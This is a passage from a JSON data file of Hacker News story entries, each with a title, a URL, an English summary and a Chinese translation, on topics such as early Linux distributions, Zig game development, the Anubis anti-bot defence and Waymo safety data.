    "summary": "This LWN.net article profiles Owen Le Blanc, the creator of MCC Interim Linux, considered the first true Linux distribution with a proper installer, released in early 1992. Before MCC, installing Linux required significant manual effort using boot and root floppy disk images, DOS, and Minix. Le Blanc, working at the Manchester Computing Centre, created MCC to simplify this process, initially for use in university courses.\n\nMCC Interim Linux allowed users to install Linux from a pair of floppy disks, utilizing ramdisk code by Ted Ts'o, binaries from H.J. Lu, and Le Blanc's own Linux fdisk. The distribution included essential tools like GCC, GNU Awk, and GNU Emacs, but not more extensive software like XFree86. While not commercially distributed by MCC, it was included in Walnut Creek's Linux Toolkit CD sets. Le Blanc credits assistance from various individuals, including Torvalds, Ts'o, and Cox, highlighting the importance of testing.\n\nLe Blanc eventually transitioned to Debian and encouraged others to do the same, even including a migration tool in MCC's final release. He then focused on managing university servers and supporting Linux applications, promoting Debian and Ubuntu. The article also touches on Le Blanc's frustrations with universities and other institutions being hesitant to adopt open-source software. Despite its short lifespan, MCC Interim Linux served as a crucial stepping stone for the development of later distributions like Debian.\n",
    "chinese_title": "欧文·勒布朗：首个Linux发行版的创建者",
    "chinese_summary": "LWN.net 介绍了 MCC Interim Linux 的创建者 Owen Le Blanc。MCC Interim Linux 被认为是第一个真正的 Linux 发行版，拥有合适的安装程序，于 1992 年初发布。在 MCC 之前，安装 Linux 需要大量的手动操作，包括使用引导和根软盘镜像、DOS 和 Minix。在曼彻斯特计算中心工作的 Le Blanc 创建 MCC 的目的是简化这一过程，最初是用于大学课程。\n\nMCC Interim Linux 允许用户从一对软盘安装 Linux，它使用了 Ted Ts'o 的 ramdisk 代码、H.J. Lu 的二进制文件以及 Le Blanc 自己的 Linux fdisk。该发行版包括 GCC、GNU Awk 和 GNU Emacs 等基本工具，但不包括像 XFree86 这样更广泛的软件。虽然 MCC 没有进行商业发行，但它被包含在 Walnut Creek 的 Linux Toolkit CD 套装中。Le Blanc 感谢包括 Torvalds、Ts'o 和 Cox 在内的多位人士的帮助，强调了测试的重要性。\n\nLe Blanc 最终转向 Debian，并鼓励其他人也这样做，甚至在 MCC 的最终版本中包含了一个迁移工具。然后，他专注于管理大学服务器和支持 Linux 应用程序，推广 Debian 和 Ubuntu。文章还提到了 Le Blanc 对大学和其他机构不愿采用开源软件的挫败感。尽管 MCC Interim Linux 的生命周期很短，但它为 Debian 等后续发行版的开发奠定了至关重要的基础。"
  },
  {
    "id": "43870688",
    "title": "The un-celebrity president: Jimmy Carter shuns riches, lives modestly (2018)",
    "url": "https://www.washingtonpost.com/news/national/wp/2018/08/17/feature/the-un-celebrity-president-jimmy-carter-shuns-riches-lives-modestly-in-his-georgia-hometown/",
    "summary": "Jimmy Carter, the former U.S. President, is portrayed as an \"un-celebrity\" in the article, highlighting his remarkably modest lifestyle and detachment from wealth and fame, especially compared to many other former presidents. He chooses to live in his small hometown of Plains, Georgia, in the same modest house he built before entering politics.\n\nThe article emphasizes Carter's dedication to service and simplicity. He continues to teach Sunday school, engage in Habitat for Humanity projects, and actively participate in his community. Despite opportunities to capitalize on his presidency through lucrative speaking engagements and book deals, Carter deliberately avoids exploiting his status for personal financial gain.\n\nThe article contrasts Carter's choices with those of other former presidents who have amassed considerable wealth post-presidency. Carter's frugality and commitment to a simple life are presented as a testament to his values and a reflection of his character, prioritizing service and community over accumulating riches. His lack of ostentation is noted, reinforcing the image of a leader who remained grounded despite holding the highest office in the land.\n",
    "chinese_title": "不事张扬的总统：吉米·卡特谢绝财富，生活简朴 (2018)",
    "chinese_summary": "文章将美国前总统吉米·卡特描述为一位“反名人”，着重强调了他极为简朴的生活方式以及对财富和名利的淡泊，这与许多其他前总统形成了鲜明对比。他选择居住在他位于佐治亚州普莱恩斯的小镇上，住在他在进入政界前建造的同一栋朴素住宅里。\n\n文章强调了卡特对服务和简单的奉献精神。他继续教授主日学，参与仁人家园项目，并积极参与他的社区活动。尽管有机会通过有利可图的演讲和图书交易来利用他的总统身份，但卡特刻意避免利用他的地位来获取个人经济利益。\n\n文章将卡特的选择与其他卸任后积累了大量财富的前总统的选择进行了对比。卡特的节俭和对简单生活的承诺被认为是他的价值观和人格的体现，他将服务和社区置于积累财富之上。文章特别指出他缺乏炫耀，从而强化了一个即使担任国家最高职位也依然脚踏实地的领导人的形象。"
  },
  {
    "id": "43864800",
    "title": "Felix86: Run x86-64 programs on RISC-V Linux",
    "url": "https://felix86.com/",
    "summary": "The article \"Felix86: Run x86-64 programs on RISC-V Linux\" announces the release of Felix86 version 25.05. The core message is that significant progress was achieved in the Felix86 project during April.\n\nThe title suggests that Felix86 is a tool or system that enables the execution of x86-64 programs on a RISC-V Linux environment. This implies a form of emulation or binary translation, allowing users to run software compiled for the x86-64 architecture on systems utilizing the RISC-V architecture. The \"Read More\" link hints at further details regarding the specific improvements and features included in the 25.05 release and developed in April.\n",
    "chinese_title": "Felix86：在RISC-V Linux上运行x86-64程序",
    "chinese_summary": "文章《Felix86：在RISC-V Linux上运行x86-64程序》宣布Felix86版本25.05发布。核心信息是四月份Felix86项目取得了重大进展。\n\n标题表明Felix86是一个工具或系统，它能够在RISC-V Linux环境下执行x86-64程序。这暗示着一种仿真或二进制翻译的形式，允许用户在采用RISC-V架构的系统上运行为x86-64架构编译的软件。“阅读更多”链接暗示了关于25.05版本中包含的具体改进和功能，以及四月份开发的更多细节。"
  },
  {
    "id": "43869093",
    "title": "Mathematician solves algebra's oldest problem using intriguing number sequences",
    "url": "https://phys.org/news/2025-05-mathematician-algebra-oldest-problem-intriguing.amp",
    "summary": "UNSW Honorary Professor Norman Wildberger, with computer scientist Dr. Dean Rubine, has developed a new method for solving higher-order polynomial equations (degree five or higher), a long-standing challenge in algebra. Their approach, published in *The American Mathematical Monthly*, avoids the use of radicals and irrational numbers, which Wildberger believes are problematic due to their reliance on infinity.\n\nThe traditional method for solving lower-order polynomials relies on radicals, but Évariste Galois proved that a general formula using radicals is impossible for equations of degree five and higher. Wildberger's new method utilizes special extensions of polynomials called \"power series\" and novel number sequences related to combinatorics, specifically extending the concept of Catalan numbers to a multi-dimensional array called the \"Geode.\" By truncating the power series, approximate numerical answers can be extracted and the method's accuracy can be verified.\n\nThis new approach provides a logical solution to polynomial equations and holds practical promise for creating computer programs that can solve equations using algebraic series instead of radicals. Wildberger suggests that the \"Geode\" array presents significant opportunities for future research and could have far-reaching implications for applied mathematics. He anticipates the study of the Geode array will generate many new questions and keep combinatorialists busy for years.\n",
    "chinese_title": "数学家利用有趣的数列解决了代数中最古老的问题",
    "chinese_summary": "新南威尔士大学荣誉教授Norman Wildberger与计算机科学家Dean Rubine博士合作，开发出一种求解高阶多项式方程（五次或更高次）的新方法，这是代数学中一个长期存在的挑战。他们的方法发表在《美国数学月刊》上，避免使用根式和无理数，Wildberger认为这些方法由于依赖于无穷大而存在问题。\n\n求解低阶多项式的传统方法依赖于根式，但埃瓦里斯特·伽罗瓦证明了使用根式的通用公式对于五次及更高次的方程是不可能的。Wildberger的新方法利用多项式的特殊扩展，称为“幂级数”，以及与组合数学相关的新型数列，特别是将卡塔兰数的概念扩展到一个名为“大地体(Geode)”的多维数组。通过截断幂级数，可以提取近似数值解，并验证该方法的准确性。\n\n这种新方法为多项式方程提供了一种逻辑解决方案，并为创建可以使用代数级数而不是根式来求解方程的计算机程序提供了实际希望。Wildberger认为，“大地体”阵列为未来的研究提供了重要的机会，并可能对应用数学产生深远的影响。他预计对大地体阵列的研究将产生许多新的问题，并让组合数学家们忙碌多年。"
  },
  {
    "id": "43851212",
    "title": "LLMs for Engineering: Teaching Models to Design High Powered Rockets",
    "url": "https://arxiv.org/abs/2504.19394",
    "summary": "This paper, \"LLMs for Engineering: Teaching Models to Design High Powered Rockets,\" explores the application of Large Language Models (LLMs) to a physical engineering domain: high-powered rocket design. The authors, led by Toby Simonds, introduce RocketBench, a benchmark that connects LLMs to high-fidelity rocket simulations.\n\nThe study evaluates LLMs on two rocket design tasks: target altitude optimization and precision landing. Initial results reveal that while LLMs possess a good baseline of engineering knowledge, they struggle to iteratively improve their designs based on simulation feedback and ultimately perform below human-level.\n\nHowever, the paper demonstrates a significant improvement when LLMs are enhanced with Reinforcement Learning (RL). A 7B parameter model, trained using RL, surpasses both state-of-the-art foundation models and human experts in rocket design tasks. This finding suggests that RL-trained LLMs can be powerful tools for complex engineering optimization, potentially extending the impact of LLMs beyond software development to diverse engineering fields. The paper highlights the potential of combining LLMs with RL to create effective engineering tools.\n",
    "chinese_title": "LLM在工程领域的应用：教模型设计高功率火箭",
    "chinese_summary": "面向工程的LLM：教导模型设计高功率火箭\n\n本文“面向工程的LLM：教导模型设计高功率火箭”探讨了大型语言模型（LLM）在物理工程领域中的应用：高功率火箭设计。由Toby Simonds领导的作者们介绍了RocketBench，这是一个将LLM与高保真火箭模拟连接起来的基准。\n\n该研究评估了LLM在两个火箭设计任务中的表现：目标高度优化和精确着陆。初步结果表明，虽然LLM具备良好的工程知识基础，但它们难以根据模拟反馈迭代改进设计，最终表现低于人类水平。\n\n然而，当LLM通过强化学习（RL）增强时，本文展示了显著的改进。一个使用RL训练的7B参数模型在火箭设计任务中超越了最先进的基础模型和人类专家。这一发现表明，经过RL训练的LLM可以成为复杂工程优化的强大工具，有可能将LLM的影响从软件开发扩展到各种工程领域。本文强调了将LLM与RL相结合以创建有效工程工具的潜力。"
  },
  {
    "id": "43860726",
    "title": "Dopamine signals when a fear can be forgotten",
    "url": "https://picower.mit.edu/news/dopamine-signals-when-fear-can-be-forgotten",
    "summary": "This 2025 study reveals a dopamine-driven mechanism in the mouse brain that enables fear extinction after a threat has passed. Researchers at MIT, led by Susumu Tonegawa, discovered that dopamine released along a specific circuit between the ventral tegmental area (VTA) and the amygdala acts as an \"all-clear\" signal, teaching the brain to unlearn fear.\n\nThe study builds on previous work identifying two populations of neurons in the amygdala involved in fear learning and extinction: Rspo2 neurons in the anterior basolateral amygdala (aBLA) encode fear memories, while Ppp1r1b neurons in the posterior basolateral amygdala (pBLA) encode fear extinction memories. This new research shows that dopaminergic neurons in the VTA connect to both amygdala populations. Neurons in the anterior VTA project to the aBLA, while neurons in the center and posterior VTA project to the pBLA.\n\nImportantly, dopamine release onto pBLA neurons, which express D1 receptors, is critical for fear extinction. When mice were exposed to a previously feared environment without experiencing a shock, dopamine activity increased in the pBLA, correlating with successful fear extinction. Conversely, manipulating dopamine signaling by quieting VTA inputs to the pBLA impaired fear extinction, while activating them accelerated it. Activating VTA inputs to the aBLA reinstated fear. Manipulation of the receptors on the Rspo2 and Ppp1r1b cells also showed their importance.\n\nThe findings suggest that this specific dopamine circuit is a key target for developing treatments for anxiety disorders and PTSD by modulating dopamine signaling to promote fear extinction.\n",
    "chinese_title": "多巴胺信号提示何时可以忘记恐惧。",
    "chinese_summary": "这项2025年的研究揭示了小鼠大脑中一种多巴胺驱动的机制，该机制使威胁过后能够消除恐惧。由利根川进领导的麻省理工学院研究人员发现，沿腹侧被盖区（VTA）和杏仁核之间特定回路释放的多巴胺充当“一切安全”信号，教会大脑忘记恐惧。\n\n该研究建立在先前工作的基础上，先前工作确定了杏仁核中参与恐惧学习和消除的两个神经元群：前基底外侧杏仁核（aBLA）中的Rspo2神经元编码恐惧记忆，而后基底外侧杏仁核（pBLA）中的Ppp1r1b神经元编码恐惧消除记忆。这项新研究表明，VTA中的多巴胺能神经元与这两个杏仁核群相连。前VTA中的神经元投射到aBLA，而中心和后VTA中的神经元投射到pBLA。\n\n重要的是，多巴胺释放到表达D1受体的pBLA神经元上对于消除恐惧至关重要。当小鼠暴露于先前恐惧的环境而没有受到电击时，pBLA中的多巴胺活性增加，这与成功消除恐惧相关。相反，通过抑制VTA对pBLA的输入来操纵多巴胺信号传导会损害恐惧消除，而激活它们会加速恐惧消除。激活VTA对aBLA的输入会恢复恐惧。对Rspo2和Ppp1r1b细胞上的受体的操纵也表明了它们的重要性。\n\n研究结果表明，这种特定的多巴胺回路是开发治疗焦虑症和创伤后应激障碍（PTSD）的关键靶点，可以通过调节多巴胺信号传导来促进恐惧消除。"
  },
  {
    "id": "43869353",
    "title": "Suno v4.5",
    "url": "https://suno.com/explore/",
    "summary": "This article, titled \"Suno v4.5,\" is essentially a large list of musical genres and subgenres, presented as a long string of text. It appears to be a comprehensive, though somewhat chaotic, collection of styles, spanning a vast range of influences from around the world.\n\nThe list includes broad genres like acoustic, blues, jazz, rock, electronic, hip-hop, and classical, as well as specific subgenres, regional variations, and fusions. We see combinations like \"acoustic chicago blues,\" \"afro-cuban jazz,\" \"ambient dub techno,\" and \"arabic pop.\" The list also includes hybrid genres that are likely AI-generated or very niche, such as \"hypnagogic goa trance,\" \"koto drill and bass,\" and \"slushwave dancehall.\"\n\nThe repeated mentions of \"acoustic chicago blues,\" \"afro-cuban jazz,\" and \"ambient house\" might suggest these are particularly prominent or well-represented within the Suno v4.5 model's capabilities (if this indeed refers to a music generation model).\n\nThe sheer length and eclectic nature of the list imply a system aiming for broad musical coverage, encompassing both familiar and more obscure or experimental styles. However, the lack of structure beyond a simple list format makes it difficult to discern any clear hierarchy or prioritization of genres. It essentially serves as an inventory of musical influences.\n",
    "chinese_title": "Suno v4.5",
    "chinese_summary": "本文题为“Suno v4.5”，本质上是一个庞大的音乐流派和子流派列表，以长字符串文本的形式呈现。 它似乎是一个全面的，但略显混乱的风格集合，涵盖了来自世界各地的广泛影响。\n\n该列表包括原声、布鲁斯、爵士、摇滚、电子、嘻哈和古典等广泛的流派，以及特定的子流派、地域变体和融合。 我们看到了诸如“芝加哥原声布鲁斯”、“非洲古巴爵士”、“氛围Dub Techno”和“阿拉伯流行”之类的组合。 该列表还包括可能是人工智能生成的或非常小众的混合流派，例如“催眠果阿迷幻”、“古筝鼓打贝斯”和“Slushwave Dancehall”。\n\n反复提及“芝加哥原声布鲁斯”、“非洲古巴爵士”和“氛围浩室”可能表明这些在 Suno v4.5 模型的功能中特别突出或具有代表性（如果这确实指的是音乐生成模型）。\n\n该列表的长度和兼收并蓄的性质意味着一个旨在广泛覆盖音乐的系统，涵盖了熟悉的和更晦涩或实验性的风格。 然而，除了简单的列表格式之外，缺乏结构使得难以辨别任何清晰的流派层次结构或优先级。 它本质上充当了音乐影响的清单。"
  },
  {
    "id": "43871730",
    "title": "Sea snail teeth top Kevlar, titanium as strongest material",
    "url": "https://www.cbc.ca/radio/asithappens/as-it-happens-thursday-edition-1.2963357/sea-snail-teeth-top-kevlar-titanium-as-world-s-strongest-material-1.2963549",
    "summary": "British researchers have discovered that limpet teeth, belonging to a type of sea snail, are the strongest biological material ever tested, surpassing even Kevlar and titanium. The teeth, measuring about a millimeter long, contain thin fibers of the mineral goethite, giving them remarkable strength.\n\nLimpets require these strong teeth to scrape algae off rocks for food, making them far stronger than previously recognized biological materials like spider silk, boasting approximately ten times the strength.\n\nAccording to lead author Asa Barber, the exceptional strength of limpet teeth opens possibilities for mimicking their structure to create stronger materials for use in applications like next-generation airplanes, racing cars, and electronics. The research was published in the Journal of the Royal Society Interface.\n",
    "chinese_title": "海螺牙齿强度超越凯夫拉和钛，成为最强材料",
    "chinese_summary": "英国研究人员发现，属于一种海螺的帽贝牙齿是有史以来测试过的最强的生物材料，甚至超过了凯夫拉尔纤维和钛。这些大约一毫米长的牙齿含有针铁矿的细纤维，赋予了它们非凡的强度。\n\n帽贝需要这些坚固的牙齿来刮掉岩石上的藻类作为食物，这使得它们比以前公认的蜘蛛丝等生物材料强得多，强度大约是后者的十倍。\n\n据主要作者阿萨·巴伯称，帽贝牙齿的卓越强度为模仿其结构创造更坚固的材料开辟了可能性，可用于下一代飞机、赛车和电子产品等应用。该研究发表在《皇家学会界面杂志》上。"
  },
  {
    "id": "43865740",
    "title": "Reflecting on a Year of Gamedev in Zig",
    "url": "https://bgthompson.codeberg.page/blog/one-year-zig-gamedev-reflections/",
    "summary": "Benjamin Thompson reflects on a year of game development using Zig, sharing insights valuable beyond just game development. He highlights the helpfulness of the Zig Discord community in resolving both basic and complex issues, even compiler-related problems.\n\nHe notes Zig's excellent built-in support for vectors, facilitating efficient SIMD operations, but points out the current lack of native matrix support, requiring custom or C libraries. Thompson praises the Zig build system as a significant improvement over alternatives like CMake, emphasizing its debuggability and clarity.\n\nAcknowledging that parts of the standard library are incomplete, he illustrates this with an example involving trigonometric functions. However, he also details how the compiler is evolving rapidly with breaking but exciting changes, highlighting faster compile times, improved performance, and new features like the `--watch` compile option. He anticipates further improvements with the upcoming new x86 backend and incremental compilation, leading to drastically reduced compile times. Overall, he's had a great experience and is excited to continue developing in Zig, anticipating future improvements to the language and toolchain.\n",
    "chinese_title": "用 Zig 开发游戏一年的回顾",
    "chinese_summary": "本杰明·汤普森回顾了使用Zig进行游戏开发的一年，分享的见解不仅仅对游戏开发有价值。他强调了Zig Discord社区在解决基础和复杂问题（甚至包括编译器相关问题）方面的帮助。\n\n他指出Zig对向量的出色内置支持，促进了高效的SIMD运算，但也指出目前缺乏原生矩阵支持，需要自定义或C库。汤普森称赞Zig构建系统是对CMake等替代方案的重大改进，强调其可调试性和清晰度。\n\n他承认标准库的部分内容尚不完整，并用涉及三角函数的例子说明了这一点。然而，他还详细介绍了编译器如何快速发展，带来突破性的但令人兴奋的改变，强调更快的编译时间、改进的性能以及诸如`--watch`编译选项等新特性。他预计即将推出的新x86后端和增量编译将带来进一步的改进，从而大幅缩短编译时间。总的来说，他拥有很棒的体验，并很高兴继续使用Zig进行开发，期待该语言和工具链的未来改进。"
  },
  {
    "id": "43860137",
    "title": "Llasa: Llama-Based Speech Synthesis",
    "url": "https://llasatts.github.io/llasatts/",
    "summary": "This paper introduces LLaSA, a new framework for speech synthesis leveraging the power of large language models (LLMs) like LLaMA. Unlike many current systems that use multiple stages, LLaSA utilizes a single-layer vector quantizer (VQ) codec and a single Transformer architecture, making it simpler and more aligned with standard LLMs. The core idea explored is scaling both training-time and inference-time compute to improve speech synthesis quality.\n\nThe researchers found that increasing training-time compute for LLaSA leads to significant improvements in the naturalness of synthesized speech and enables the generation of more complex and accurate prosody. They trained and released various sized models (1B, 3B, and 8B parameters).\n\nFurthermore, the paper investigates the impact of scaling inference-time compute. By using speech understanding models as \"verifiers\" during the sampling process, they observed that scaling inference time allows the model to shift its sampling towards the preferences of these verifiers. This, in turn, improves various aspects of the synthesized speech, including emotional expressiveness, timbre consistency, and content accuracy. The paper provides examples and comparisons against other TTS systems, showing the capabilities of LLaSA in generating emotionally nuanced speech. The code and model checkpoints have been made publicly available.\n",
    "chinese_title": "拉萨：基于 Llama 的语音合成",
    "chinese_summary": "本文介绍LLaSA，一种利用大型语言模型（LLMs）（如LLaMA）的新语音合成框架。与许多使用多阶段的现有系统不同，LLaSA采用单层矢量量化(VQ)编解码器和单个Transformer架构，使其更简单，更符合标准LLM。本文探索的核心思想是扩展训练时和推理时的计算量，以提高语音合成质量。\n\n研究人员发现，增加LLaSA的训练时计算量可以显著提高合成语音的自然度，并生成更复杂和准确的韵律。他们训练并发布了各种规模的模型（10亿、30亿和80亿参数）。\n\n此外，本文还研究了扩展推理时计算量的影响。通过在采样过程中使用语音理解模型作为“验证器”，他们观察到扩展推理时间可以使模型将其采样转移到这些验证器的偏好上。反过来，这提高了合成语音的各个方面，包括情感表达、音色一致性和内容准确性。本文提供了与其他TTS系统的示例和比较，展示了LLaSA在生成情感细微语音方面的能力。代码和模型检查点已公开提供。"
  },
  {
    "id": "43864108",
    "title": "Anubis saved our websites from a DDoS attack",
    "url": "https://fabulous.systems/posts/2025/05/anubis-saved-our-websites-from-a-ddos-attack/",
    "summary": "The ScummVM project's website, including its wiki and forums, was hit by a distributed denial-of-service (DDoS) attack, causing the server to become overloaded and inaccessible. The attack involved a large number of unique IP addresses generating resource-intensive requests to the wiki, specifically targeting database-dependent pages and overwhelming the server's Apache2, PHP-FPM, and MariaDB stack.\n\nTraditional mitigation strategies like IP blocking and geo-blocking were ineffective due to the scale and global distribution of the attack. To combat the issue, the author deployed Anubis, a program designed to protect websites from AI scraper bots, but also proved highly effective against this DDoS.\n\nAnubis sits between the incoming connections and the web application. It checks for known good and bad clients. For clients in the \"in-between,\" Anubis presents a proof-of-work challenge, forcing potential bots to expend CPU resources before gaining access. Legitimate users experience a brief loading screen, while attackers with basic bots are blocked, and sophisticated bots are forced to exhaust their own resources.\n\nThe implementation of Anubis immediately resolved the server overload and restored website stability. The article concludes that Anubis is a viable solution not only for AI scraper protection but also as a powerful tool against DDoS attacks by shifting the resource burden to the attacker.\n",
    "chinese_title": "阿努比斯拯救了我们的网站，使其免受DDoS攻击。",
    "chinese_summary": "ScummVM项目的网站，包括其维基和论坛，遭受了分布式拒绝服务(DDoS)攻击，导致服务器过载且无法访问。该攻击涉及大量唯一的IP地址向维基生成资源密集型请求，特别是针对依赖数据库的页面，并压垮了服务器的Apache2、PHP-FPM和MariaDB堆栈。\n\n由于攻击的规模和全球分布，传统的缓解策略（如IP阻止和地理阻止）无效。为了解决这个问题，作者部署了Anubis，一个旨在保护网站免受AI爬虫机器人攻击的程序，但也被证明对这种DDoS攻击非常有效。\n\nAnubis位于传入连接和Web应用程序之间。它检查已知的良好和不良客户端。对于“中间”的客户端，Anubis会提出一个工作量证明挑战，迫使潜在的机器人消耗CPU资源才能获得访问权限。合法用户会体验到短暂的加载屏幕，而拥有基本机器人的攻击者会被阻止，复杂的机器人则被迫耗尽自己的资源。\n\nAnubis的实施立即解决了服务器过载问题并恢复了网站的稳定性。文章总结说，Anubis不仅是AI爬虫保护的可行解决方案，而且通过将资源负担转移给攻击者，也是对抗DDoS攻击的强大工具。"
  },
  {
    "id": "43857643",
    "title": "AI code review: Should the author be the reviewer?",
    "url": "https://www.greptile.com/blog/ai-code-reviews-conflict",
    "summary": "Daksh, co-founder of Greptile (an AI code review tool), explores the question of whether an AI author should also be the AI reviewer. This question arose from noticing that an AI bot, Devin, was submitting more pull requests than any individual human on GitHub.\n\nWhile traditionally, companies prefer fresh eyes reviewing code, Daksh argues there are counterpoints to consider in the AI context. LLM APIs are stateless, making each request for review \"fresh.\" Furthermore, the \"scaffolding\" – the specific workflows and context retrieval processes – employed by AI code reviewers and AI code generators are distinct, even if they use the same underlying LLM.\n\nDaksh contends that AI has made programmers faster but may have reduced the *average* quality of code, especially since engineers may not scrutinize AI-generated code as thoroughly as their own. A key reason is that prompting is imperfect and Engineers can't keep up with the speed of AI-generated code. AI-generated code also tends to introduce bugs that humans are less likely to create or catch.\n\nIronically, AI is proving to be better than humans at detecting bugs, although still far from perfect. Greptile's testing showed that the Anthropic Sonnet model identified significantly more bugs in a benchmark than highly skilled engineers. The article concludes with a disclaimer, acknowledging Greptile's vested interest in AI code review but emphasizing the genuine intellectual curiosity driving their work.\n",
    "chinese_title": "AI 代码审查：作者应否担任审查员？",
    "chinese_summary": "达克什：AI作者也应是AI审阅者吗？"
  },
  {
    "id": "43861828",
    "title": "New Study: Waymo is reducing serious crashes and making streets safer",
    "url": "https://waymo.com/blog/2025/05/waymo-making-streets-safer-for-vru",
    "summary": "A new study, accepted for publication in the Traffic Injury Prevention Journal, demonstrates that Waymo's autonomous driving technology is significantly reducing severe crashes and improving road safety. Comparing Waymo Driver performance to human drivers over 56.7 million miles, the research reveals substantial reductions in injury-involving crashes, especially for vulnerable road users (VRUs).\n\nKey findings include a 92% reduction in pedestrian injuries, 82% reduction in cyclist and motorcyclist injuries, and a 96% reduction in injury-involving intersection crashes. This improvement at intersections is largely attributed to Waymo's ability to detect and react to red light runners. Furthermore, the study indicates an 85% reduction in crashes with suspected serious or worse injuries.\n\nWaymo's Chief Safety Officer, Mauricio Peña, emphasized the company's commitment to reducing serious crashes and protecting all road users. Jonathan Adkins, CEO of the Governors Highway Safety Association, praised the real-world data showcasing Waymo's safety improvements, particularly for pedestrians and cyclists.\n\nThe study builds upon previous research and adds to the growing evidence that Waymo's technology is contributing to safer roadways and the vision of zero traffic deaths and serious injuries. Waymo plans to continue gathering safety data and collaborating with researchers, policymakers, and safety groups to advance road safety.\n",
    "chinese_title": "新研究：Waymo正在减少严重事故，使街道更安全",
    "chinese_summary": "一项新研究表明Waymo自动驾驶技术显著降低严重事故并提升道路安全"
  },
  {
    "id": "43828099",
    "title": "DECtalk Archive",
    "url": "https://dectalk.nu/",
    "summary": "This document is an archive dedicated to DECtalk, a speech synthesizer originally developed by Digital Equipment Corporation (DEC) in 1984. It details the history of DECtalk, from its origins with Dennis Klatt's work at MIT to its various iterations under DEC, Force Computers, and Fonix Corporation.\n\nThe archive provides information on different DECtalk editions, including hardware like the DTC-01, DECtalk PC, and DECtalk Express, as well as software versions released for Windows NT. It highlights key versions like 4.2CD, considered the best sounding, and notes the changes introduced by different owners.\n\nThe document outlines the archive's contents, organized into categories like artists' creations, miscellaneous files, Red Dwarf transcripts, software/manuals, speech synthesis demonstrations, and text files (songs). It also includes a content warning regarding potentially offensive material.\n\nIt encourages contributions to the archive and provides instructions for sharing content, recommending the use of FLAC for audio files.  The archive promotes distribution of its content and suggests using Resilio Sync to help maintain and share the archive with others. The article concludes with information about legality, a version list, resources, and a changelog.\n",
    "chinese_title": "DECtalk 档案馆",
    "chinese_summary": "本文档是一个关于DECtalk的档案，DECtalk是由数字设备公司（DEC）于1984年开发的语音合成器。它详细介绍了DECtalk的历史，从丹尼斯·克拉特在麻省理工学院的研究起源，到其在DEC、Force Computers和Fonix Corporation下的各种迭代版本。\n\n该档案提供了关于不同DECtalk版本的信息，包括DTC-01、DECtalk PC和DECtalk Express等硬件，以及为Windows NT发布的软件版本。它突出了像4.2CD这样被认为音质最好的关键版本，并记录了不同所有者引入的更改。\n\n本文档概述了档案的内容，组织成艺术家作品、杂项文件、《红矮星》剧本、软件/手册、语音合成演示和文本文件（歌曲）等类别。它还包括一个关于潜在冒犯性材料的内容警告。\n\n它鼓励向档案投稿，并提供共享内容的说明，建议音频文件使用FLAC格式。该档案鼓励分发其内容，并建议使用Resilio Sync来帮助维护和与他人共享档案。文章最后提供了关于合法性、版本列表、资源和变更日志的信息。"
  },
  {
    "id": "43860428",
    "title": "Millihertz 5 Mechanical Computer (2022)",
    "url": "https://www.srimech.com/MHZ5.html",
    "summary": "The \"Millihertz 5 Mechanical Computer,\" also known as \"Offspring,\" is a mechanical computer currently under construction, modeled after the Manchester Small-Scale Experimental Machine (\"Baby\").  It utilizes ball bearings as data elements. The computer features an 8x8 bit RAM and an 8-bit datapath that includes a subtractor and an accumulator.  Design documents, including a PDF and a Pandoc-rendered HTML version, are available for review. The project has log entries dating back to 2018, with updates in April 2020 and August 2022, tracking the progress of this mechanical replica of the Manchester SSEM.\n",
    "chinese_title": "毫赫兹5型机械计算机 (2022)",
    "chinese_summary": "“毫赫兹5型机械计算机”，又名“后代”，是一台正在建造中的机械计算机，以曼彻斯特小型实验机（“宝贝”）为原型。它使用滚珠轴承作为数据元素。该计算机具有一个8x8位RAM和一个包含减法器和累加器的8位数据通路。设计文档，包括PDF和Pandoc渲染的HTML版本，可供查阅。该项目有自2018年起，于2020年4月和2022年8月更新的日志条目，记录了这台曼彻斯特SSEM机械复制品的进展。"
  },
  {
    "id": "43870039",
    "title": "The Danish language, even the Danes don't understand it [video]",
    "url": "https://www.youtube.com/watch?v=s-mOy8VUEBk",
    "summary": "The provided content describes a YouTube video titled \"The Danish language, even the Danes don't understand it.\" However, the actual content provided is unrelated to the video's topic. It's just standard YouTube boilerplate text including copyright information, legal disclaimers, and information about Google LLC and NFL Sunday Ticket. There is no actual summary of the video's content present. Therefore, I can only say that the video is likely humorous or informative about the perceived difficulty of the Danish language, even for native speakers, but I have no actual details about the video's content.\n",
    "chinese_title": "丹麦语，连丹麦人都不懂 [视频]",
    "chinese_summary": "提供的文本描述了一个名为“丹麦语，甚至丹麦人都不懂”的YouTube视频。然而，实际提供的内容与视频主题无关，只是标准的YouTube样板文字，包括版权信息、法律免责声明以及关于Google LLC和NFL Sunday Ticket的信息。没有关于视频内容的实际摘要。因此，我只能说该视频很可能是关于丹麦语难度的幽默或信息性视频，即使对于母语者来说也是如此，但我没有关于视频内容的实际细节。"
  },
  {
    "id": "43863418",
    "title": "Show HN: Kubetail – Real-time log search for Kubernetes",
    "url": "https://github.com/kubetail-org/kubetail",
    "summary": "Kubetail is presented as a real-time logging dashboard for Kubernetes, designed for multi-container workload log tailing in a browser or terminal. It fetches logs directly from the Kubernetes API, eliminating the need for external log forwarding and tracking container lifecycle events.\n\nKey features include a user-friendly interface, real-time log viewing, filtering by workload, time range, node properties, and grep functionality. It prioritizes data privacy by using the Kubernetes API, keeping logs within the cluster. The dashboard can be installed on a desktop or within the cluster and supports switching between clusters.\n\nThe post offers quickstart guides for desktop (using Homebrew, shell script, or binaries) and cluster (using Helm, YAML manifests, or Glasskube) installations.\n\nThe documentation is available online. The development section describes the project's monorepo structure, including the CLI, Cluster API, Cluster Agent, and Dashboard modules, along with setup, build, and running instructions.\n\nFinally, it encourages community involvement through UI/UX design, React frontend development, bug reporting, and feature suggestions. Contact information (email, Discord, Slack) is provided for reaching out.\n",
    "chinese_title": "显示 HN：Kubetail – Kubernetes 的实时日志搜索",
